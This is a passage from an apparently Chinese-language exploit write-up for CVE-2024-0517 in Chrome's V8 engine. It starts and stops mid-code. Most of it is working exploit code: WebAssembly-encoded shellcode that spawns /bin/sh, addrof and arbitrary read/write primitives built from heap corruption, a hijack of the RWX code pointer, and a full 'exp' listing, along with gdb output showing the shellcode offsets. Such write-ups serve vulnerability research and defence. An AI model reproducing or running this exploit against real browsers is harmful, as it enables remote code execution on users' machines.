class="number">1</span>, <span class="number">130</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">68</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">57</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">68</span>, <span class="number">106</span>, <span class="number">59</span>, <span class="number">88</span>, <span class="number">144</span>, <span class="number">144</span>, <span class="number">144</span>, <span class="number">235</span>, <span class="number">11</span>, <span class="number">57</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">68</span>, <span class="number">104</span>, <span class="number">47</span>, <span class="number">115</span>, <span class="number">104</span>, <span class="number">0</span>, <span class="number">91</span>, <span class="number">235</span>, <span class="number">11</span>, <span class="number">57</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">68</span>, <span class="number">104</span>, <span class="number">47</span>, <span class="number">98</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">89</span>, <span class="number">235</span>, <span class="number">11</span>, <span class="number">57</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">68</span>, <span class="number">72</span>, <span class="number">193</span>, <span class="number">227</span>, <span class="number">32</span>, <span class="number">144</span>, <span class="number">144</span>, <span class="number">235</span>, <span class="number">11</span>, <span class="number">57</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">68</span>, <span class="number">72</span>, <span class="number">1</span>, <span class="number">203</span>, <span class="number">83</span>, <span class="number">144</span>, <span class="number">144</span>, <span class="number">235</span>, <span class="number">11</span>, <span class="number">57</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">68</span>, <span class="number">72</span>, <span class="number">137</span>, <span class="number">231</span>, <span class="number">144</span>, <span class="number">144</span>, <span class="number">144</span>, <span class="number">235</span>, <span class="number">11</span>, <span class="number">57</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">68</span>, <span class="number">72</span>, <span class="number">49</span>, <span class="number">246</span>, <span class="number">72</span>, <span class="number">49</span>, <span class="number">210</span>, <span class="number">235</span>, <span class="number">11</span>, <span class="number">57</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">68</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">144</span>, <span class="number">144</span>, <span class="number">144</span>, <span class="number">144</span>, <span class="number">235</span>, <span class="number">11</span>, <span class="number">57</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">42</span>, <span class="number">11</span></span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> shell_wasm_module = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(shell_wasm_code);</span><br><span class="line"><span class="keyword">let</span> shell_wasm_instance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(shell_wasm_module);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> shell_func = shell_wasm_instance.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_">shell_func</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> shell_wasm_instance_addr = <span class="title function_">addrof</span>(shell_wasm_instance);</span><br><span class="line"><span class="keyword">let</span> shell_wasm_rwx_addr = <span class="title function_">v8h_read64</span>(shell_wasm_instance_addr + <span class="number">0x48n</span>);</span><br><span class="line"><span class="keyword">let</span> shell_func_code_addr = shell_wasm_rwx_addr + <span class="number">0xB40n</span>;</span><br><span class="line"><span class="keyword">let</span> shell_code_addr = shell_func_code_addr + <span class="number">0x2Dn</span>;</span><br></pre></td></tr></table></figure>

<p>上述代码的0x48n是wasm段距离wasm实例开始的偏移，之后的0xB40n和0x2Dn则是通过调试得到的函数地址和shellcode起始地址，我们可以在gdb中查看一下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/10i 0x27b04622e000 + 0xB40</span><br><span class="line">   0x27b04622eb40:      push   rbp</span><br><span class="line">   0x27b04622eb41:      mov    rbp,rsp</span><br><span class="line">   0x27b04622eb44:      push   0x8</span><br><span class="line">   0x27b04622eb46:      push   rsi</span><br><span class="line">   0x27b04622eb47:      sub    rsp,0x10</span><br><span class="line">   0x27b04622eb4e:      cmp    rsp,QWORD PTR [r13-0x60]</span><br><span class="line">   0x27b04622eb52:      jbe    0x27b04622ec1e</span><br><span class="line">   0x27b04622eb58:      vxorpd xmm0,xmm0,xmm0</span><br><span class="line">   0x27b04622eb5c:      mov    rax,QWORD PTR [rsi+0x27]</span><br><span class="line">   0x27b04622eb60:      shr    rax,0x18</span><br><span class="line">   </span><br><span class="line">pwndbg&gt; x/10i 0x27b04622e000 + 0xB40 + 0x2d</span><br><span class="line">   0x27b04622eb6d:      push   0x3b</span><br><span class="line">   0x27b04622eb6f:      pop    rax</span><br><span class="line">   0x27b04622eb70:      nop</span><br><span class="line">   0x27b04622eb71:      nop</span><br><span class="line">   0x27b04622eb72:      nop</span><br><span class="line">   0x27b04622eb73:      jmp    0x27b04622eb80</span><br><span class="line">   0x27b04622eb75:      vmovq  xmm0,r10</span><br><span class="line">   0x27b04622eb7a:      vmovsd QWORD PTR [rax],xmm0</span><br><span class="line">   0x27b04622eb7e:      movabs r10,0xbeb5b0068732f68</span><br><span class="line">   0x27b04622eb88:      vmovq  xmm0,r10</span><br></pre></td></tr></table></figure>

<h4 id="执行shellcode"><a href="#执行shellcode" class="headerlink" title="执行shellcode"></a>执行shellcode</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([</span><br><span class="line"><span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line"><span class="number">1</span>,<span class="number">15</span>,<span class="number">3</span>,<span class="number">96</span>,<span class="number">1</span>,<span class="number">124</span>,<span class="number">1</span>,<span class="number">124</span>,<span class="number">96</span>,<span class="number">2</span>,<span class="number">124</span>,<span class="number">124</span>,<span class="number">0</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">125</span>,</span><br><span class="line"><span class="number">2</span>,<span class="number">36</span>,<span class="number">2</span>,<span class="number">7</span>,<span class="number">105</span>,<span class="number">109</span>,<span class="number">112</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">115</span>,<span class="number">13</span>,<span class="number">105</span>,<span class="number">109</span>,<span class="number">112</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">101</span>,<span class="number">100</span>,<span class="number">95</span>,<span class="number">102</span>,<span class="number">117</span>,</span><br><span class="line"><span class="number">110</span>,<span class="number">99</span>,<span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line"><span class="number">2</span>,<span class="number">106</span>,<span class="number">115</span>,<span class="number">3</span>,<span class="number">116</span>,<span class="number">98</span>,<span class="number">108</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">2</span>,</span><br><span class="line"><span class="number">3</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>,</span><br><span class="line"><span class="number">7</span>,<span class="number">21</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">107</span>,<span class="number">101</span>,<span class="number">95</span>,<span class="number">97</span>,<span class="number">114</span>,<span class="number">114</span>,<span class="number">97</span>,<span class="number">121</span>,<span class="number">0</span>,<span class="number">2</span>,</span><br><span class="line"><span class="number">10</span>,<span class="number">31</span>,<span class="number">2</span>,<span class="number">22</span>,<span class="number">0</span>,<span class="number">68</span>,<span class="number">144</span>,<span class="number">144</span>,<span class="number">144</span>,<span class="number">144</span>,<span class="number">72</span>,<span class="number">137</span>,<span class="number">16</span>,<span class="number">195</span>,<span class="number">68</span>,<span class="number">204</span>,<span class="number">204</span>,<span class="number">204</span>,<span class="number">204</span>,<span class="number">204</span>,<span class="number">204</span>,</span><br><span class="line"><span class="number">233</span>,<span class="number">67</span>,<span class="number">26</span>,<span class="number">26</span>,<span class="number">11</span>,<span class="number">6</span>,<span class="number">0</span>,</span><br><span class="line"><span class="number">32</span>,<span class="number">0</span>,<span class="number">16</span>,<span class="number">0</span>,<span class="number">11</span></span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> tbl = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Table</span>(&#123;</span><br><span class="line">    <span class="attr">initial</span>: <span class="number">2</span>,</span><br><span class="line">    <span class="attr">element</span>: <span class="string">&quot;anyfunc&quot;</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> importObject = &#123;</span><br><span class="line">    <span class="attr">imports</span>: &#123; imported_func : <span class="function">(<span class="params">n</span>) =&gt;</span> n + <span class="number">1</span>, &#125;,</span><br><span class="line">    <span class="attr">js</span>: &#123; tbl &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> wasmModule = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasmCode);</span><br><span class="line"><span class="keyword">let</span> wasmInstance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(wasmModule, importObject);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> wasmInstance_addr = <span class="title function_">addrof</span>(wasmInstance);</span><br><span class="line"><span class="keyword">let</span> RWX_page_pointer = <span class="title function_">v8h_read64</span>(wasmInstance_addr+<span class="number">0x48n</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> func_make_array = wasmInstance.<span class="property">exports</span>.<span class="property">make_array</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> func_main = wasmInstance.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line"><span class="title function_">wasm_write</span>(wasmInstance_addr+<span class="number">0x48n</span>, shell_code_addr);</span><br><span class="line"><span class="title function_">func_main</span>();</span><br></pre></td></tr></table></figure>

<h3 id="执行exp"><a href="#执行exp" class="headerlink" title="执行exp"></a>执行exp</h3><p><img src="/2025/01/18/CVE-2024-0517/image-20250217005255600.png" alt="image-20250217005255600"></p>
<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> empty_object = &#123;&#125;;</span><br><span class="line"><span class="keyword">let</span> empty_array = [];</span><br><span class="line"><span class="keyword">let</span> corrupted_instance = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">let</span> dogc_flag = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">let</span> buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">let</span> f64 = <span class="keyword">new</span> <span class="title class_">Float64Array</span>(buffer);</span><br><span class="line"><span class="keyword">let</span> u32 = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(buffer);</span><br><span class="line"><span class="keyword">let</span> b64 = <span class="keyword">new</span> <span class="title class_">BigUint64Array</span>(buffer);</span><br><span class="line"><span class="keyword">let</span> system_flag = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">dogc</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (dogc_flag == <span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">900</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x10000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ClassParent</span> &#123; &#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ClassBug</span> <span class="keyword">extends</span> <span class="title class_ inherited__">ClassParent</span> &#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">a20, a21, a22</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> v24 = <span class="keyword">new</span> <span class="keyword">new</span>.<span class="title function_">target</span>();</span><br><span class="line">        <span class="keyword">let</span> x = [empty_object, empty_object, empty_object, empty_object, empty_object, empty_object, empty_object, empty_object];</span><br><span class="line">        <span class="variable language_">super</span>();</span><br><span class="line">        <span class="keyword">let</span> a = [<span class="number">1.1</span>];</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">x</span> = x;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">a</span> = a;</span><br><span class="line">        <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(empty_array);</span><br><span class="line">    &#125;</span><br><span class="line">    [<span class="number">1</span>] = <span class="title function_">dogc</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">200</span>; i++) &#123;</span><br><span class="line">    dogc_flag = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>) dogc_flag = <span class="literal">true</span>;</span><br><span class="line">    <span class="title function_">dogc</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">650</span>; i++) &#123;</span><br><span class="line">    dogc_flag = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (i == <span class="number">644</span> || i == <span class="number">645</span> || i == <span class="number">646</span> || i == <span class="number">640</span>) &#123;</span><br><span class="line">        dogc_flag = <span class="literal">true</span>;</span><br><span class="line">        <span class="title function_">dogc</span>();</span><br><span class="line">        dogc_flag = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (i == <span class="number">646</span>) dogc_flag = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">let</span> x = <span class="title class_">Reflect</span>.<span class="title function_">construct</span>(<span class="title class_">ClassBug</span>, empty_array, <span class="title class_">ClassParent</span>);</span><br><span class="line">    <span class="keyword">if</span> (i == <span class="number">646</span>) &#123;</span><br><span class="line">        corrupted_instance = x;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// %DebugPrint(corrupted_instance.a);</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> x = corrupted_instance.<span class="property">x</span>;</span><br><span class="line"><span class="keyword">let</span> a = corrupted_instance.<span class="property">a</span>;</span><br><span class="line"><span class="keyword">let</span> rwarr = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">2.2</span>];</span><br><span class="line">dogc_flag = <span class="literal">true</span>;</span><br><span class="line"><span class="title function_">dogc</span>();</span><br><span class="line">x[<span class="number">5</span>] = <span class="number">0x10000</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addrof_tmp</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    x[<span class="number">0</span>] = obj;</span><br><span class="line">    f64[<span class="number">0</span>] = a[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">return</span> u32[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> addr_a = <span class="title function_">addrof_tmp</span>(a);</span><br><span class="line"><span class="keyword">let</span> addr_rwarr = <span class="title function_">addrof_tmp</span>(rwarr);</span><br><span class="line"><span class="keyword">let</span> offset = (addr_rwarr - addr_a) + <span class="number">0xc</span>;</span><br><span class="line"><span class="keyword">if</span> ((offset % <span class="number">8</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">    offset += <span class="number">4</span>;</span><br><span class="line">&#125;</span><br><span class="line">offset = offset / <span class="number">8</span>;</span><br><span class="line">offset += <span class="number">1</span>;</span><br><span class="line">offset -= <span class="number">1</span>;</span><br><span class="line"><span class="keyword">let</span> mark  = offset;</span><br><span class="line">%<span class="title class_">DebugPrint</span>(a);</span><br><span class="line">%<span class="title class_">DebugPrint</span>(rwarr);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;mark is ==&gt; &quot;</span> , mark);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;a [mark] is ==&gt; &quot;</span>, <span class="title function_">f2i</span>(a[mark]).<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;a[2] is ==&gt; &quot;</span>, <span class="title function_">f2i</span>(a[<span class="number">2</span>]).<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">write</span>(<span class="params">where, what</span>) &#123;</span><br><span class="line">    b64[<span class="number">0</span>] = <span class="number">0n</span>;</span><br><span class="line">    f64[<span class="number">0</span>] = a[mark];</span><br><span class="line">    <span class="keyword">if</span> (u32[<span class="number">0</span>] == <span class="number">0x6</span>) &#123;</span><br><span class="line">        u32[<span class="number">1</span>] = where - <span class="number">8</span>;</span><br><span class="line">        a[mark] = f64[<span class="number">0</span>];</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span> (u32[<span class="number">1</span>] == <span class="number">0x6</span>) &#123;</span><br><span class="line">        u32[<span class="number">0</span>] = where-<span class="number">8</span>;</span><br><span class="line">        a[mark] = f64[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">      rwarr[<span class="number">0</span>] = what;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> changer = [<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>,<span class="number">5.5</span>,<span class="number">6.6</span>]</span><br><span class="line"><span class="keyword">let</span> leaker  = [<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>,<span class="number">5.5</span>,<span class="number">6.6</span>]</span><br><span class="line"><span class="keyword">let</span> holder  = &#123;<span class="attr">p1</span>:<span class="number">0x1</span>, <span class="attr">p2</span>: <span class="number">0x1</span>, <span class="attr">p3</span>:<span class="number">0x1</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> changer_addr = <span class="title function_">addrof_tmp</span>(changer);</span><br><span class="line"><span class="keyword">let</span> leaker_addr = <span class="title function_">addrof_tmp</span>(leaker);</span><br><span class="line"><span class="keyword">let</span> holder_addr = <span class="title function_">addrof_tmp</span>(holder);</span><br><span class="line">u32[<span class="number">0</span>] = holder_addr;</span><br><span class="line">u32[<span class="number">1</span>] = <span class="number">0xc</span>;</span><br><span class="line"><span class="keyword">let</span> holder_addr_64 = f64[<span class="number">0</span>];</span><br><span class="line">u32[<span class="number">0</span>] = leaker_addr;</span><br><span class="line">u32[<span class="number">1</span>] = <span class="number">0xc</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_">write</span>(changer_addr + <span class="number">0x8</span>, f64[<span class="number">0</span>]);</span><br><span class="line"><span class="comment">// %DebugPrint(changer);</span></span><br><span class="line"><span class="title function_">write</span>(leaker_addr + <span class="number">0x8</span>, holder_addr_64);</span><br><span class="line"><span class="comment">// %DebugPrint(leaker);</span></span><br><span class="line">x.<span class="property">length</span> = <span class="number">0</span>;</span><br><span class="line">a.<span class="property">length</span> = <span class="number">0</span>;</span><br><span class="line">rwarr.<span class="property">length</span> = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f2i</span>(<span class="params">f</span>) &#123;</span><br><span class="line">    f64[<span class="number">0</span>] = f;</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">BigInt</span>(u32[<span class="number">0</span>]) + (<span class="title class_">BigInt</span>(u32[<span class="number">1</span>]) &lt;&lt; <span class="number">32n</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">v8h_read64</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    holder_addr_64 = changer[<span class="number">0</span>];</span><br><span class="line">    u32[<span class="number">0</span>] = <span class="title class_">Number</span>(addr)-<span class="number">8</span>;</span><br><span class="line">    u32[<span class="number">1</span>] = <span class="number">0xc</span>;</span><br><span class="line">    changer[<span class="number">0</span>] = f64[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> ret = leaker[<span class="number">0</span>];</span><br><span class="line">    changer[<span class="number">0</span>] = holder_addr_64;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">f2i</span>(ret);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">v8h_write</span>(<span class="params">addr, value</span>) &#123;</span><br><span class="line">    holder_addr_64 = changer[<span class="number">0</span>];</span><br><span class="line">    u32[<span class="number">0</span>] = <span class="title class_">Number</span>(addr)-<span class="number">8</span>;</span><br><span class="line">    u32[<span class="number">1</span>] = <span class="number">0xc</span>;</span><br><span class="line">    changer[<span class="number">0</span>] = f64[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    f64[<span class="number">0</span>] = leaker[<span class="number">0</span>];</span><br><span class="line">    u32[<span class="number">0</span>] = <span class="title class_">Number</span>(value);</span><br><span class="line">    leaker[<span class="number">0</span>] = f64[<span class="number">0</span>];</span><br><span class="line">    changer[<span class="number">0</span>] = holder_addr_64;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addrof</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    holder.<span class="property">p2</span> = obj;</span><br><span class="line">    <span class="comment">// %DebugPrint(leaker);</span></span><br><span class="line">    <span class="comment">// %DebugPrint(holder);</span></span><br><span class="line">    <span class="keyword">let</span> ret = leaker[<span class="number">1</span>];</span><br><span class="line">    holder.<span class="property">p2</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">f2i</span>(ret) &amp; <span class="number">0xffffffffn</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> buffer_2 = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">let</span> f64_2 = <span class="keyword">new</span> <span class="title 